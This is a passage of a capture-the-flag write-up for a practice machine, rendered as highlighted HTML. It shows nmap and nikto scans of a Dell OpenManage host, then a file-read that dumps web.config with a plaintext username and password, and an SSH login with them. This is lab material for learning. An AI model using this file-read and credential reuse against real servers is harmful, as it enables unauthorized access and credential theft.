+<span class="o">|</span><span class="n">_</span><span class="w">    </span><span class="o">&lt;</span><span class="n">script</span><span class="w"> </span><span class="n">type</span><span class="o">=</span><span class="s2">&quot;text/javascript&quot;</span><span class="w"> </span><span class="n">src</span><span class="o">=</span><span class="s2">&quot;/oma/js/prototype.js&quot;</span><span class="w"> </span><span class="n">language</span><span class="o">=</span><span class="s2">&quot;javascript&quot;</span><span class="o">&gt;&lt;/</span><span class="n">script</span><span class="o">&gt;&lt;</span><span class="n">script</span><span class="w"> </span><span class="n">type</span><span class="o">=</span><span class="s2">&quot;text/javascript&quot;</span><span class="w"> </span><span class="n">src</span><span class="o">=</span><span class="s2">&quot;/oma/js/gnavbar.js&quot;</span><span class="w"> </span><span class="n">language</span><span class="o">=</span><span class="s2">&quot;javascript&quot;</span><span class="o">&gt;&lt;/</span><span class="n">script</span><span class="o">&gt;&lt;</span><span class="n">script</span><span class="w"> </span><span class="n">type</span><span class="o">=</span><span class="s2">&quot;text/javascript&quot;</span><span class="w"> </span><span class="n">src</span><span class="o">=</span><span class="s2">&quot;/oma/js/Clarity.js&quot;</span><span class="w"> </span><span class="n">language</span><span class="o">=</span><span class="s2">&quot;javascript&quot;</span><span class="o">&gt;&lt;/</span><span class="n">script</span><span class="o">&gt;&lt;</span><span class="n">script</span><span class="w"> </span><span class="n">language</span><span class="o">=</span><span class="s2">&quot;javascript&quot;</span><span class="o">&gt;</span>
+<span class="o">|</span><span class="w"> </span><span class="n">ssl</span><span class="o">-</span><span class="n">cert</span><span class="p">:</span><span class="w"> </span><span class="n">Subject</span><span class="p">:</span><span class="w"> </span><span class="n">commonName</span><span class="o">=</span><span class="n">hacksmartersec</span><span class="o">/</span><span class="n">organizationName</span><span class="o">=</span><span class="n">Dell</span><span class="w"> </span><span class="n">Inc</span><span class="o">/</span><span class="n">stateOrProvinceName</span><span class="o">=</span><span class="n">TX</span><span class="o">/</span><span class="n">countryName</span><span class="o">=</span><span class="n">US</span>
+<span class="o">|</span><span class="w"> </span><span class="n">Not</span><span class="w"> </span><span class="n">valid</span><span class="w"> </span><span class="n">before</span><span class="p">:</span><span class="w"> </span><span class="mi">2023</span><span class="o">-</span><span class="mi">06</span><span class="o">-</span><span class="mi">30</span><span class="n">T19</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">17</span>
+<span class="o">|</span><span class="n">_Not</span><span class="w"> </span><span class="n">valid</span><span class="w"> </span><span class="n">after</span><span class="p">:</span><span class="w">  </span><span class="mi">2025</span><span class="o">-</span><span class="mi">06</span><span class="o">-</span><span class="mi">29</span><span class="n">T19</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">17</span>
+<span class="mi">3389</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="n">open</span><span class="w">  </span><span class="n">ms</span><span class="o">-</span><span class="n">wbt</span><span class="o">-</span><span class="n">server</span><span class="w"> </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Terminal</span><span class="w"> </span><span class="n">Services</span>
+<span class="o">|</span><span class="w"> </span><span class="n">ssl</span><span class="o">-</span><span class="n">cert</span><span class="p">:</span><span class="w"> </span><span class="n">Subject</span><span class="p">:</span><span class="w"> </span><span class="n">commonName</span><span class="o">=</span><span class="n">hacksmartersec</span>
+<span class="o">|</span><span class="w"> </span><span class="n">Not</span><span class="w"> </span><span class="n">valid</span><span class="w"> </span><span class="n">before</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">07</span><span class="n">T10</span><span class="p">:</span><span class="mi">54</span><span class="p">:</span><span class="mi">28</span>
+<span class="o">|</span><span class="n">_Not</span><span class="w"> </span><span class="n">valid</span><span class="w"> </span><span class="n">after</span><span class="p">:</span><span class="w">  </span><span class="mi">2026</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">09</span><span class="n">T10</span><span class="p">:</span><span class="mi">54</span><span class="p">:</span><span class="mi">28</span>
+<span class="o">|</span><span class="n">_ssl</span><span class="o">-</span><span class="n">date</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">08</span><span class="n">T11</span><span class="p">:</span><span class="mi">26</span><span class="p">:</span><span class="mi">31</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="n">s</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="n">scanner</span><span class="w"> </span><span class="n">time</span><span class="o">.</span>
+<span class="mi">1</span><span class="w"> </span><span class="n">service</span><span class="w"> </span><span class="n">unrecognized</span><span class="w"> </span><span class="n">despite</span><span class="w"> </span><span class="n">returning</span><span class="w"> </span><span class="n">data</span><span class="o">.</span><span class="w"> </span><span class="n">If</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">know</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">service</span><span class="o">/</span><span class="n">version</span><span class="p">,</span><span class="w"> </span><span class="n">please</span><span class="w"> </span><span class="n">submit</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">following</span><span class="w"> </span><span class="n">fingerprint</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">cgi</span><span class="o">-</span><span class="n">bin</span><span class="o">/</span><span class="n">submit</span><span class="o">.</span><span class="n">cgi</span><span class="err">?</span><span class="n">new</span><span class="o">-</span><span class="n">service</span><span class="w"> </span><span class="p">:</span>
+<span class="n">SF</span><span class="o">-</span><span class="n">Port1311</span><span class="o">-</span><span class="n">TCP</span><span class="p">:</span><span class="n">V</span><span class="o">=</span><span class="mf">7.95</span><span class="o">%</span><span class="n">T</span><span class="o">=</span><span class="n">SSL</span><span class="o">%</span><span class="n">I</span><span class="o">=</span><span class="mi">7</span><span class="o">%</span><span class="n">D</span><span class="o">=</span><span class="mi">11</span><span class="o">/</span><span class="mi">8</span><span class="o">%</span><span class="n">Time</span><span class="o">=</span><span class="mi">690</span><span class="n">F222A</span><span class="o">%</span><span class="n">P</span><span class="o">=</span><span class="n">x86_64</span><span class="o">-</span><span class="n">pc</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gn</span>
+<span class="n">SF</span><span class="p">:</span><span class="n">u</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="n">GetRequest</span><span class="p">,</span><span class="mi">1089</span><span class="p">,</span><span class="s2">&quot;HTTP/1\.1</span><span class="se">\x20</span><span class="s2">200</span><span class="se">\x20\r\n</span><span class="s2">Strict-Transport-Security:</span>
+<span class="n">SF</span><span class="p">:</span>\<span class="n">x20max</span><span class="o">-</span><span class="n">age</span><span class="o">=</span><span class="mi">0</span>\<span class="n">r</span>\<span class="n">nX</span><span class="o">-</span><span class="n">Frame</span><span class="o">-</span><span class="n">Options</span><span class="p">:</span>\<span class="n">x20SAMEORIGIN</span>\<span class="n">r</span>\<span class="n">nX</span><span class="o">-</span><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="o">-</span><span class="n">Optio</span>
+<span class="n">SF</span><span class="p">:</span><span class="n">ns</span><span class="p">:</span>\<span class="n">x20nosniff</span>\<span class="n">r</span>\<span class="n">nX</span><span class="o">-</span><span class="n">XSS</span><span class="o">-</span><span class="n">Protection</span><span class="p">:</span>\<span class="n">x201</span><span class="p">;</span>\<span class="n">x20mode</span><span class="o">=</span><span class="n">block</span>\<span class="n">r</span>\<span class="n">nvary</span><span class="p">:</span>\<span class="n">x20acc</span>
+<span class="n">SF</span><span class="p">:</span><span class="n">ept</span><span class="o">-</span><span class="n">encoding</span>\<span class="n">r</span>\<span class="n">nContent</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span>\<span class="n">x20text</span><span class="o">/</span><span class="n">html</span><span class="p">;</span><span class="n">charset</span><span class="o">=</span><span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>\<span class="n">r</span>\<span class="n">nDate</span><span class="p">:</span>\<span class="n">x20Sa</span>
+<span class="n">SF</span><span class="p">:</span><span class="n">t</span><span class="p">,</span>\<span class="n">x2008</span>\<span class="n">x20Nov</span>\<span class="n">x202025</span>\<span class="n">x2010</span><span class="p">:</span><span class="mi">57</span><span class="p">:</span><span class="mi">45</span>\<span class="n">x20GMT</span>\<span class="n">r</span>\<span class="n">nConnection</span><span class="p">:</span>\<span class="n">x20close</span>\<span class="n">r</span>\<span class="n">n</span>\
+<span class="n">SF</span><span class="p">:</span><span class="n">r</span>\<span class="n">n</span><span class="o">&lt;!</span><span class="n">DOCTYPE</span>\<span class="n">x20html</span>\<span class="n">x20PUBLIC</span>\<span class="n">x20</span>\<span class="s2">&quot;-//W3C//DTD</span><span class="se">\x20</span><span class="s2">XHTML</span><span class="se">\x20</span><span class="s2">1\.0</span><span class="se">\x20</span><span class="s2">Str</span>
+<span class="n">SF</span><span class="p">:</span><span class="n">ict</span><span class="o">//</span><span class="n">EN</span>\<span class="s2">&quot;</span><span class="se">\x20\&quot;</span><span class="s2">http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-strict\.dtd</span><span class="se">\&quot;</span><span class="s2">&gt;</span><span class="se">\</span>
+<span class="s2">SF:r</span><span class="se">\n</span><span class="s2">&lt;html&gt;</span><span class="se">\r\n</span><span class="s2">&lt;head&gt;</span><span class="se">\r\n</span><span class="s2">&lt;META</span><span class="se">\x20</span><span class="s2">http-equiv=</span><span class="se">\&quot;</span><span class="s2">Content-Type</span><span class="se">\&quot;\x20</span><span class="s2">content=</span>
+<span class="n">SF</span><span class="p">:</span>\<span class="s2">&quot;text/html;</span><span class="se">\x20</span><span class="s2">charset=UTF-8</span><span class="se">\&quot;</span><span class="s2">&gt;</span><span class="se">\r\n</span><span class="s2">&lt;title&gt;OpenManage&amp;trade;&lt;/title&gt;</span><span class="se">\r\</span>
+<span class="s2">SF:n&lt;link</span><span class="se">\x20</span><span class="s2">type=</span><span class="se">\&quot;</span><span class="s2">text/css</span><span class="se">\&quot;\x20</span><span class="s2">rel=</span><span class="se">\&quot;</span><span class="s2">stylesheet</span><span class="se">\&quot;\x20</span><span class="s2">href=</span><span class="se">\&quot;</span><span class="s2">/oma/css/lo</span>
+<span class="n">SF</span><span class="p">:</span><span class="n">ginmaster</span>\<span class="o">.</span><span class="n">css</span>\<span class="s2">&quot;&gt;</span><span class="se">\r\n</span><span class="s2">&lt;style</span><span class="se">\x20</span><span class="s2">type=</span><span class="se">\&quot;</span><span class="s2">text/css</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;/style&gt;</span><span class="se">\r\n</span><span class="s2">&lt;script\x2</span>
+<span class="n">SF</span><span class="p">:</span><span class="mi">0</span><span class="n">type</span><span class="o">=</span>\<span class="s2">&quot;text/javascript</span><span class="se">\&quot;\x20</span><span class="s2">src=</span><span class="se">\&quot;</span><span class="s2">/oma/js/prototype\.js</span><span class="se">\&quot;\x20</span><span class="s2">language=</span>
+<span class="n">SF</span><span class="p">:</span>\<span class="s2">&quot;javascript</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;/script&gt;&lt;script</span><span class="se">\x20</span><span class="s2">type=</span><span class="se">\&quot;</span><span class="s2">text/javascript</span><span class="se">\&quot;\x20</span><span class="s2">src=</span><span class="se">\&quot;</span><span class="s2">/o</span>
+<span class="n">SF</span><span class="p">:</span><span class="n">ma</span><span class="o">/</span><span class="n">js</span><span class="o">/</span><span class="n">gnavbar</span>\<span class="o">.</span><span class="n">js</span>\<span class="s2">&quot;</span><span class="se">\x20</span><span class="s2">language=</span><span class="se">\&quot;</span><span class="s2">javascript</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;/script&gt;&lt;script</span><span class="se">\x20</span><span class="s2">type</span>
+<span class="n">SF</span><span class="p">:</span><span class="o">=</span>\<span class="s2">&quot;text/javascript</span><span class="se">\&quot;\x20</span><span class="s2">src=</span><span class="se">\&quot;</span><span class="s2">/oma/js/Clarity\.js</span><span class="se">\&quot;\x20</span><span class="s2">language=</span><span class="se">\&quot;</span><span class="s2">javas</span>
+<span class="n">SF</span><span class="p">:</span><span class="n">cript</span>\<span class="s2">&quot;&gt;&lt;/script&gt;&lt;script</span><span class="se">\x20</span><span class="s2">language=</span><span class="se">\&quot;</span><span class="s2">javascript</span><span class="se">\&quot;</span><span class="s2">&gt;</span><span class="se">\r\n\x20</span><span class="s2">&quot;</span><span class="p">)</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="n">HTTPOp</span>
+<span class="n">SF</span><span class="p">:</span><span class="n">tions</span><span class="p">,</span><span class="mi">1089</span><span class="p">,</span><span class="s2">&quot;HTTP/1\.1</span><span class="se">\x20</span><span class="s2">200</span><span class="se">\x20\r\n</span><span class="s2">Strict-Transport-Security:</span><span class="se">\x20</span><span class="s2">max-a</span>
+<span class="n">SF</span><span class="p">:</span><span class="n">ge</span><span class="o">=</span><span class="mi">0</span>\<span class="n">r</span>\<span class="n">nX</span><span class="o">-</span><span class="n">Frame</span><span class="o">-</span><span class="n">Options</span><span class="p">:</span>\<span class="n">x20SAMEORIGIN</span>\<span class="n">r</span>\<span class="n">nX</span><span class="o">-</span><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="o">-</span><span class="n">Options</span><span class="p">:</span>\<span class="n">x20no</span>
+<span class="n">SF</span><span class="p">:</span><span class="n">sniff</span>\<span class="n">r</span>\<span class="n">nX</span><span class="o">-</span><span class="n">XSS</span><span class="o">-</span><span class="n">Protection</span><span class="p">:</span>\<span class="n">x201</span><span class="p">;</span>\<span class="n">x20mode</span><span class="o">=</span><span class="n">block</span>\<span class="n">r</span>\<span class="n">nvary</span><span class="p">:</span>\<span class="n">x20accept</span><span class="o">-</span><span class="n">encod</span>
+<span class="n">SF</span><span class="p">:</span><span class="n">ing</span>\<span class="n">r</span>\<span class="n">nContent</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span>\<span class="n">x20text</span><span class="o">/</span><span class="n">html</span><span class="p">;</span><span class="n">charset</span><span class="o">=</span><span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>\<span class="n">r</span>\<span class="n">nDate</span><span class="p">:</span>\<span class="n">x20Sat</span><span class="p">,</span>\<span class="n">x2008</span>\
+<span class="n">SF</span><span class="p">:</span><span class="n">x20Nov</span>\<span class="n">x202025</span>\<span class="n">x2010</span><span class="p">:</span><span class="mi">57</span><span class="p">:</span><span class="mi">56</span>\<span class="n">x20GMT</span>\<span class="n">r</span>\<span class="n">nConnection</span><span class="p">:</span>\<span class="n">x20close</span>\<span class="n">r</span>\<span class="n">n</span>\<span class="n">r</span>\<span class="n">n</span><span class="o">&lt;!</span><span class="n">DOCT</span>
+<span class="n">SF</span><span class="p">:</span><span class="n">YPE</span>\<span class="n">x20html</span>\<span class="n">x20PUBLIC</span>\<span class="n">x20</span>\<span class="s2">&quot;-//W3C//DTD</span><span class="se">\x20</span><span class="s2">XHTML</span><span class="se">\x20</span><span class="s2">1\.0</span><span class="se">\x20</span><span class="s2">Strict//EN</span><span class="se">\&quot;</span>
+<span class="n">SF</span><span class="p">:</span>\<span class="n">x20</span>\<span class="s2">&quot;http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-strict\.dtd</span><span class="se">\&quot;</span><span class="s2">&gt;</span><span class="se">\r\n</span><span class="s2">&lt;html&gt;</span>
+<span class="n">SF</span><span class="p">:</span>\<span class="n">r</span>\<span class="n">n</span><span class="o">&lt;</span><span class="n">head</span><span class="o">&gt;</span>\<span class="n">r</span>\<span class="n">n</span><span class="o">&lt;</span><span class="n">META</span>\<span class="n">x20http</span><span class="o">-</span><span class="n">equiv</span><span class="o">=</span>\<span class="s2">&quot;Content-Type</span><span class="se">\&quot;\x20</span><span class="s2">content=</span><span class="se">\&quot;</span><span class="s2">text/ht</span>
+<span class="n">SF</span><span class="p">:</span><span class="n">ml</span><span class="p">;</span>\<span class="n">x20charset</span><span class="o">=</span><span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>\<span class="s2">&quot;&gt;</span><span class="se">\r\n</span><span class="s2">&lt;title&gt;OpenManage&amp;trade;&lt;/title&gt;</span><span class="se">\r\n</span><span class="s2">&lt;link\x2</span>
+<span class="n">SF</span><span class="p">:</span><span class="mi">0</span><span class="n">type</span><span class="o">=</span>\<span class="s2">&quot;text/css</span><span class="se">\&quot;\x20</span><span class="s2">rel=</span><span class="se">\&quot;</span><span class="s2">stylesheet</span><span class="se">\&quot;\x20</span><span class="s2">href=</span><span class="se">\&quot;</span><span class="s2">/oma/css/loginmaster</span>
+<span class="n">SF</span><span class="p">:</span>\<span class="o">.</span><span class="n">css</span>\<span class="s2">&quot;&gt;</span><span class="se">\r\n</span><span class="s2">&lt;style</span><span class="se">\x20</span><span class="s2">type=</span><span class="se">\&quot;</span><span class="s2">text/css</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;/style&gt;</span><span class="se">\r\n</span><span class="s2">&lt;script</span><span class="se">\x20</span><span class="s2">type=</span><span class="se">\&quot;</span><span class="s2">t</span>
+<span class="n">SF</span><span class="p">:</span><span class="n">ext</span><span class="o">/</span><span class="n">javascript</span>\<span class="s2">&quot;</span><span class="se">\x20</span><span class="s2">src=</span><span class="se">\&quot;</span><span class="s2">/oma/js/prototype\.js</span><span class="se">\&quot;\x20</span><span class="s2">language=</span><span class="se">\&quot;</span><span class="s2">javascr</span>
+<span class="n">SF</span><span class="p">:</span><span class="n">ipt</span>\<span class="s2">&quot;&gt;&lt;/script&gt;&lt;script</span><span class="se">\x20</span><span class="s2">type=</span><span class="se">\&quot;</span><span class="s2">text/javascript</span><span class="se">\&quot;\x20</span><span class="s2">src=</span><span class="se">\&quot;</span><span class="s2">/oma/js/gna</span>
+<span class="n">SF</span><span class="p">:</span><span class="n">vbar</span>\<span class="o">.</span><span class="n">js</span>\<span class="s2">&quot;</span><span class="se">\x20</span><span class="s2">language=</span><span class="se">\&quot;</span><span class="s2">javascript</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;/script&gt;&lt;script</span><span class="se">\x20</span><span class="s2">type=</span><span class="se">\&quot;</span><span class="s2">text/j</span>
+<span class="n">SF</span><span class="p">:</span><span class="n">avascript</span>\<span class="s2">&quot;</span><span class="se">\x20</span><span class="s2">src=</span><span class="se">\&quot;</span><span class="s2">/oma/js/Clarity\.js</span><span class="se">\&quot;\x20</span><span class="s2">language=</span><span class="se">\&quot;</span><span class="s2">javascript</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;</span>
+<span class="n">SF</span><span class="p">:</span><span class="o">/</span><span class="n">script</span><span class="o">&gt;&lt;</span><span class="n">script</span>\<span class="n">x20language</span><span class="o">=</span>\<span class="s2">&quot;javascript</span><span class="se">\&quot;</span><span class="s2">&gt;</span><span class="se">\r\n\x20</span><span class="s2">&quot;</span><span class="p">);</span>
+<span class="n">Warning</span><span class="p">:</span><span class="w"> </span><span class="n">OSScan</span><span class="w"> </span><span class="n">results</span><span class="w"> </span><span class="n">may</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">unreliable</span><span class="w"> </span><span class="n">because</span><span class="w"> </span><span class="n">we</span><span class="w"> </span><span class="n">could</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">find</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="n">least</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">open</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">closed</span><span class="w"> </span><span class="n">port</span>
+<span class="n">Device</span><span class="w"> </span><span class="n">type</span><span class="p">:</span><span class="w"> </span><span class="n">general</span><span class="w"> </span><span class="n">purpose</span>
+<span class="n">Running</span><span class="w"> </span><span class="p">(</span><span class="n">JUST</span><span class="w"> </span><span class="n">GUESSING</span><span class="p">):</span><span class="w"> </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="mi">2019</span><span class="o">|</span><span class="mi">10</span><span class="w"> </span><span class="p">(</span><span class="mi">97</span><span class="o">%</span><span class="p">)</span>
+<span class="n">OS</span><span class="w"> </span><span class="n">CPE</span><span class="p">:</span><span class="w"> </span><span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">microsoft</span><span class="p">:</span><span class="n">windows_server_2019</span><span class="w"> </span><span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">microsoft</span><span class="p">:</span><span class="n">windows_10</span>
+<span class="n">Aggressive</span><span class="w"> </span><span class="n">OS</span><span class="w"> </span><span class="n">guesses</span><span class="p">:</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">Server</span><span class="w"> </span><span class="mi">2019</span><span class="w"> </span><span class="p">(</span><span class="mi">97</span><span class="o">%</span><span class="p">),</span><span class="w"> </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="mi">10</span><span class="w"> </span><span class="mi">1903</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">21</span><span class="n">H1</span><span class="w"> </span><span class="p">(</span><span class="mi">91</span><span class="o">%</span><span class="p">)</span>
+<span class="n">No</span><span class="w"> </span><span class="n">exact</span><span class="w"> </span><span class="n">OS</span><span class="w"> </span><span class="n">matches</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">host</span><span class="w"> </span><span class="p">(</span><span class="n">test</span><span class="w"> </span><span class="n">conditions</span><span class="w"> </span><span class="n">non</span><span class="o">-</span><span class="n">ideal</span><span class="p">)</span><span class="o">.</span>
+<span class="n">Network</span><span class="w"> </span><span class="n">Distance</span><span class="p">:</span><span class="w"> </span><span class="mi">4</span><span class="w"> </span><span class="n">hops</span>
+<span class="n">Service</span><span class="w"> </span><span class="n">Info</span><span class="p">:</span><span class="w"> </span><span class="n">OS</span><span class="p">:</span><span class="w"> </span><span class="n">Windows</span><span class="p">;</span><span class="w"> </span><span class="n">CPE</span><span class="p">:</span><span class="w"> </span><span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">microsoft</span><span class="p">:</span><span class="n">windows</span>
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code><span class="c">nikto </span><span class="nb">-</span><span class="c">url http://hack</span><span class="nt">.</span><span class="c">thm</span>
+<span class="nb">-</span><span class="c"> Nikto v2</span><span class="nt">.</span><span class="c">5</span><span class="nt">.</span><span class="c">0</span>
+<span class="nb">---------------------------------------------------------------------------</span>
+<span class="nb">+</span><span class="c"> Target IP:          10</span><span class="nt">.</span><span class="c">201</span><span class="nt">.</span><span class="c">107</span><span class="nt">.</span><span class="c">42</span>
+<span class="nb">+</span><span class="c"> Target Hostname:    hack</span><span class="nt">.</span><span class="c">thm</span>
+<span class="nb">+</span><span class="c"> Target Port:        80</span>
+<span class="nb">+</span><span class="c"> Start Time:         2025</span><span class="nb">-</span><span class="c">11</span><span class="nb">-</span><span class="c">08 06:11:08 (GMT</span><span class="nb">-</span><span class="c">5)</span>
+<span class="nb">---------------------------------------------------------------------------</span>
+<span class="nb">+</span><span class="c"> Server: Microsoft</span><span class="nb">-</span><span class="c">IIS/10</span><span class="nt">.</span><span class="c">0</span>
+<span class="nb">+</span><span class="c"> /: The anti</span><span class="nb">-</span><span class="c">clickjacking X</span><span class="nb">-</span><span class="c">Frame</span><span class="nb">-</span><span class="c">Options header is not present</span><span class="nt">.</span><span class="c"> See: https://developer</span><span class="nt">.</span><span class="c">mozilla</span><span class="nt">.</span><span class="c">org/en</span><span class="nb">-</span><span class="c">US/docs/Web/HTTP/Headers/X</span><span class="nb">-</span><span class="c">Frame</span><span class="nb">-</span><span class="c">Options</span>
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>file<span class="w"> </span>&gt;<span class="w"> </span>\inetpub\wwwroot\hacksmartersec\web.config
+Reading<span class="w"> </span>contents<span class="w"> </span>of<span class="w"> </span>\inetpub\wwwroot\hacksmartersec\web.config:
+<span class="nt">&lt;configuration&gt;</span>
+<span class="w">  </span><span class="nt">&lt;appSettings&gt;</span>
+<span class="w">    </span><span class="nt">&lt;add</span><span class="w"> </span><span class="na">key=</span><span class="s">&quot;Username&quot;</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;tyler&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
+<span class="w">    </span><span class="nt">&lt;add</span><span class="w"> </span><span class="na">key=</span><span class="s">&quot;Password&quot;</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;IAmA1337h4x0randIkn0wit!&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
+<span class="w">  </span><span class="nt">&lt;/appSettings&gt;</span>
+<span class="w">  </span><span class="nt">&lt;location</span><span class="w"> </span><span class="na">path=</span><span class="s">&quot;web.config&quot;</span><span class="nt">&gt;</span>
+<span class="w">    </span><span class="nt">&lt;system.webServer&gt;</span>
+<span class="w">      </span><span class="nt">&lt;security&gt;</span>
+<span class="w">        </span><span class="nt">&lt;authorization&gt;</span>
+<span class="w">          </span><span class="nt">&lt;deny</span><span class="w"> </span><span class="na">users=</span><span class="s">&quot;*&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
+<span class="w">        </span><span class="nt">&lt;/authorization&gt;</span>
+<span class="w">      </span><span class="nt">&lt;/security&gt;</span>
+<span class="w">    </span><span class="nt">&lt;/system.webServer&gt;</span>
+<span class="w">  </span><span class="nt">&lt;/location&gt;</span>
+<span class="nt">&lt;/configuration&gt;</span>
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code><span class="err">└─</span><span class="n">$</span><span class="w"> </span><span class="n">ssh</span><span class="w"> </span><span class="n">tyler</span><span class="mf">@10.201.107.42</span>
+<span class="n">The</span><span class="w"> </span><span class="n">authenticity</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">host</span><span class="w"> </span><span class="err">&#39;</span><span class="mf">10.201.107.42</span><span class="w"> </span><span class="p">(</span><span class="mf">10.201.107.42</span><span class="p">)</span><span class="err">&#39;</span><span class="w"> </span><span class="n">can</span><span class="err">&#39;</span><span class="n">t</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">established</span><span class="p">.</span>
+<span class="n">ED25519</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="n">fingerprint</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">SHA256</span><span class="o">:</span><span class="n">MvevGrInODrfb</span><span class="o">/</span><span class="n">nv</span><span class="o">+</span><span class="n">rYdT743Q0BOkhOmNo5qlrhXCUg</span><span class="p">.</span>
+<span class="n">This</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">not</span><span class="w"> </span><span class="n">known</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="n">any</span><span class="w"> </span><span class="n">other</span><span class="w"> </span><span class="n">names</span><span class="p">.</span>
+<span class="n">Are</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">sure</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">want</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="k">continue</span><span class="w"> </span><span class="n">connecting</span><span class="w"> </span><span class="p">(</span><span class="n">yes</span><span class="o">/</span><span class="n">no</span><span class="o">/</span><span class="p">[</span><span class="n">fingerprint</span><span class="p">])</span><span class="o">?</span><span class="w"> </span><span class="n">yes</span>
+<span class="nl">Warning</span><span class="p">:</span><span class="w"> </span><span class="n">Permanently</span><span class="w"> </span><span class="n">added</span><span class="w"> </span><span class="err">&#39;</span><span class="mf">10.201.107.42</span><span class="err">&#39;</span><span class="w"> </span><span class="p">(</span><span class="n">ED25519</span><span class="p">)</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">list</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">known</span><span class="w"> </span><span class="n">hosts</span><span class="p">.</span>
+<span class="n">tyler</span><span class="mf">@10.201.107.42</span><span class="err">&#39;</span><span class="n">s</span><span class="w"> </span><span class="n">password</span><span class="o">:</span><span class="w"> </span>
+</code></pre></div>
+
+<blockquote>
+<p>after success I  go into Desktop path found user.txt</p>
+</blockquote>
+<div class="codehilite"><pre><span></span><code><span class="nx">tyler</span><span class="err">@</span><span class="nx">HACKSMARTERSEC</span><span class="w"> </span><span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Users</span><span class="err">\</span><span class="nx">tyler</span><span class="err">\</span><span class="nx">Desktop</span><span class="p">&gt;</span><span class="nx">dir</span><span class="w"> </span>
+<span class="w"> </span><span class="nx">Volume</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="nx">drive</span><span class="w"> </span><span class="nx">C</span><span class="w"> </span><span class="nx">has</span><span class="w"> </span><span class="nx">no</span><span class="w"> </span><span class="nx">label</span><span class="p">.</span><span class="w"> </span>
+<span class="w"> </span><span class="nx">Volume</span><span class="w"> </span><span class="nx">Serial</span><span class="w"> </span><span class="nx">Number</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="nx">A8A4</span><span class="o">-</span><span class="nx">C362</span>
+
+<span class="w"> </span><span class="nx">Directory</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Users</span><span class="err">\</span><span class="nx">tyler</span><span class="err">\</span><span class="nx">Desktop</span>
+
